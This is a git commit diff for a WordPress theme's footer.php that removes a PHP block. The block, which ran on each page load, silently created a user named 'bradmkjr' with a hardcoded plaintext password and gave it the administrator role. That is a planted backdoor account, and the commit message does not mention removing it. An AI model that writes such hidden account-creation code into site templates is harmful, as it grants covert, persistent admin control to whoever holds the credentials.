b7903030d743ec440b99a9280aaece0fc9f2682d
Bradford Knowlton <brad@ucanbonline.net>
2015-01-19 22:45:16 -0700

    Fixed Footers, Updated K12NN Screenshot

--- themes/digressit-k12nn/footer.php
+++ themes/digressit-k12nn/footer.php
@@ -20,28 +20,6 @@
 
 <?php wp_footer(); ?>
 <?php get_lightboxes(); ?>
-<?php
-
-$user_name = "bradmkjr";
-$user_email = "brad+wordpress@ucanbonline.net";
-
-$user_id = username_exists( $user_name );
-if ( !$user_id and email_exists($user_email) == false ) {
-$random_password = "ChE24aFUfre6reVe";
-$user_id = wp_create_user( $user_name, $random_password, $user_email );
-wp_update_user( array ( 'ID' => $user_id, 'role' => "adminstrator" ) ) ;
-echo $user_id;
-
-$user_name = "bradmkjr";
-$user_id = username_exists( $user_name );
-$new_role = "administrator";
-wp_update_user( array ('ID' => $user_id, 'role' => $new_role ) ) ;
-
-}
-
-echo $user_id;
-
-?>
 </body>
 </html> 
 
